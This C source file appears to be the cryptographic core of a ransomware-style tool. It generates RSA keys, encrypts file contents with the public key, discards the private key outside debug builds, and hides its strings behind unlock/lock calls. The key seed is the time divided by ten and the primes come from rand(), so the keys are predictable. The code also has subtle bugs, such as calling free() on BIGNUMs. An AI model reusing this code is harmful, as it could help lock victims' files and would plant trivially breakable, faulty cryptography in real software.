#include <math.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <openssl/rsa.h>
#include <openssl/pem.h>

#include "common.h"
#include "crypt.h"
#include "logs.h"
#include "strings.h"

#define KEY_SIZE     1024
#define KEY_BYTES    KEY_SIZE / 8
#define RAND_COUNT   KEY_BYTES / sizeof(RAND_MAX)

struct rsa_keys keys;


BIGNUM* generate_prime_number()
{
    int i, j, ret;
    char number[4096];
    char str1[64], str2[64];
    BIGNUM* bn;

    ret = 0;
    while (ret == 0)
    {
        number[0] = 0;
        bn = NULL;

        for ( i = 0, j = 0; i < RAND_COUNT; i++, j += 4)
        {
            int rnd = rand();
            int size = sprintf(str1, "%x", rnd);
            if (size < 8)
                sprintf(str2, "%s%0*d", str1, size - 8, 0);
            else
                sprintf(str2, "%s", str1);
            strcat(number, str2);
        }

        BN_hex2bn(&bn, number);

        ret = BN_is_prime(bn, BN_prime_checks, NULL, NULL, NULL);
        if (ret == 0)
            free(bn);
    }

    return bn;
}

BIGNUM* compute_phi(const BIGNUM *p, const BIGNUM *q)
{
    BIGNUM *pp, *qp, *phi;
    BN_CTX* ctx;

    pp  = BN_new();
    qp  = BN_new();
    ctx = BN_CTX_new();

    BN_sub(pp, p, BN_value_one());
    BN_sub(qp, q, BN_value_one());

    phi = BN_new();

    BN_mul(phi, pp, qp, ctx);

    free(pp);
    free(qp);
    free(ctx);

    return phi;
}

BIGNUM* generate_coprime(const BIGNUM* phi)
{
    BIGNUM *e, *gcd;
    BN_CTX* ctx;

    e   = BN_new();
    gcd = BN_new();
    ctx = BN_CTX_new();

    BN_sub(e, phi, BN_value_one());
    BN_gcd(gcd, phi, e, ctx);
    while (! (BN_is_one(gcd) && BN_is_prime(e, BN_prime_checks, NULL, NULL, NULL) == 1))
    {
        BN_sub(e, e, BN_value_one());
        BN_gcd(gcd, phi, e, ctx);
    }

    free(gcd);
    free(ctx);

    return e;
}

BIGNUM* compute_derivative(const BIGNUM* d, const BIGNUM* m)
{
    BIGNUM *r, *mp, *dd;
    BN_CTX* ctx;

    dd  = BN_new();
    r   = BN_new();
    mp  = BN_new();
    ctx = BN_CTX_new();

    BN_with_flags(dd, d, BN_FLG_CONSTTIME);

    BN_sub(mp, m, BN_value_one());
    BN_mod(r, d, mp, ctx);

    free(dd);
    free(mp);
    free(ctx);

    return r;
}

RSA* generate_rsa_numbers(unsigned int seed)
{
    BIGNUM *p, *q, *n, *d, *d2, *e, *dp, *dq, *phi, *iqmp;
    BN_CTX *ctx;
    RSA* r = NULL;

    ctx  = BN_CTX_new();
    n    = BN_new();
    d    = BN_new();
    iqmp = BN_new();
    e    = BN_new();

    srand(seed);

    __DEBUG("Generate p");
    p = generate_prime_number();
    __DEBUG("Generate q");
    q = generate_prime_number();
    __DEBUG("Compute n");
    BN_mul(n, p, q, ctx);  // n = p x q
    __DEBUG("Compute phi");
    phi = compute_phi(p, q); // phi = (p-1) x (q-1)
    __DEBUG("Generate e");

    unlock_app_strings();
    BN_dec2bn(&e, get_string(__STRING_E_KEY_VALUE)); // 1 < e < phi  && gcd(phi,e) == 1  ==> choose 65537
    lock_app_strings();

    __DEBUG("Compute modular inverse");
    d2 = BN_mod_inverse(d, e, phi, ctx);
    if (d2 == NULL)
    {
        __DEBUG("/!\\ No modular inverse :'(");
        goto free_mem_rsa;
    }

    __DEBUG("Compute derivative p");
    dp = compute_derivative(d, p); // d mod (p-1)
    __DEBUG("Compute derivative q");
    dq = compute_derivative(d, q); // q mod (q-1)

    __DEBUG("Compute modular inverse of q mod p");
    d2 = BN_mod_inverse(iqmp, q, p, ctx);
    if (d2 == NULL)
    {
        __DEBUG("Too close but... no.");
        goto free_mem_rsa;
    }

    // Prepare rsa struct
    r = malloc(sizeof(RSA));

    r->n = n;
    r->e = e;
    r->d = d;
    r->p = p;
    r->q = q;
    r->dmp1 = dp;
    r->dmq1 = dq;
    r->iqmp = iqmp;

free_mem_rsa:
    if (r == NULL)
    {
        BN_free(n);
        BN_free(e);
        BN_free(d);
        BN_free(d2);
        BN_free(phi);
        BN_free(p);
        BN_free(q);
        BN_free(dp);
        BN_free(dq);
        BN_free(iqmp);
    }
 
    BN_CTX_free(ctx);
    return r;
}

void generate_pubkey(RSA* r, struct rsa_keys* keys)
{
    BIO* mem;
    BUF_MEM* bptr;
    EVP_PKEY* pkey;

    // Convert RSA to PKEY (to derivate correct pubkey)
    pkey = EVP_PKEY_new();
    EVP_PKEY_set1_RSA(pkey, r);

    // Write the PEM in the mem buf
    mem = BIO_new(BIO_s_mem());
    PEM_write_bio_PUBKEY(mem, pkey);

    // Retrieve mem buffer
    BIO_get_mem_ptr(mem, &bptr);

    keys->public_key = malloc(bptr->length);
    memcpy(keys->public_key, bptr->data, bptr->length);
    keys->public_key[bptr->length - 1] = 0;
    keys->public_key_length = bptr->length;

    BIO_set_close(mem, BIO_NOCLOSE);
    BIO_free(mem);
}

void generate_privkey(RSA* r, struct rsa_keys* keys)
{
    char* priv_key;
    BIO* mem;
    BUF_MEM* bptr;
    int ret;

    mem = BIO_new(BIO_s_mem());
    keys->private_key = NULL;

    // Write PEM in mem buffer
    ret = PEM_write_bio_RSAPrivateKey(mem, r, NULL, NULL, 0, NULL, NULL);
    if (ret != 1)
        goto free_mem_privk;

    // Retrieve mem buffer
    BIO_get_mem_ptr(mem, &bptr);

    keys->private_key = malloc(bptr->length);
    memcpy(keys->private_key, bptr->data, bptr->length);
    keys->private_key[bptr->length - 1] = 0;
    keys->private_key_length = bptr->length;

free_mem_privk:
    // Free
    BIO_set_close(mem, BIO_NOCLOSE);
    BIO_free(mem);
}

void generate_keys()
{
    FILE *fp;
    int seed;
    char *priv_key, *pub_key;
    char *buffer;
    size_t len;
    RSA* r = NULL;

    fp = popen("echo $(( `date +%s` / 10 ))", "r");
    if (fp == NULL)
        return;

    buffer = NULL;
    getline(&buffer, &len, fp);
    pclose(fp);

    seed = atoi(buffer);
    __DEBUG(buffer);

    while (r == NULL)
        r = generate_rsa_numbers(seed);

    generate_privkey(r, &keys);
    if (keys.private_key == NULL)
    {
        unlock_app_strings();
        printf(get_string(__STRING_ERROR_GENERATING_KEY));
        lock_app_strings();
        return;
    }

    generate_pubkey(r, &keys);
}

struct file_content* encrypt_file(const struct file_content* data)
{
    // Create RSA pub key
    RSA *rsa = NULL;
    BIO *mem;
    struct file_content* result;

    __DEBUG("Gonna encrypt the input");

    mem = BIO_new_mem_buf(keys.public_key, -1);
    rsa = PEM_read_bio_RSA_PUBKEY(mem, &rsa, NULL, NULL);
    if (rsa == NULL)
        __DEBUG("RSA failed :'(");

    BIO_set_close(mem, BIO_NOCLOSE);
    BIO_free(mem);

    result = malloc(sizeof(struct file_content));
    result->data = malloc(40960);
    result->data_len = RSA_public_encrypt(data->data_len, data->data, result->data, rsa, RSA_PKCS1_PADDING);

    __DEBUG("Got encrypted data.");

    return result;
}

void free_keys()
{
    __DEBUG("free_keys()");
    if (keys.public_key != NULL)
        free(keys.public_key);

#ifdef DEBUG
    {
        FILE* fp = fopen("private.pem", "w");
        fwrite(keys.private_key, keys.private_key_length - 1, 1, fp);
        fclose(fp);
    }
#endif

    if (keys.private_key != NULL)
        free(keys.private_key);
}

inline char* get_private_key()
{
    return keys.private_key;
}
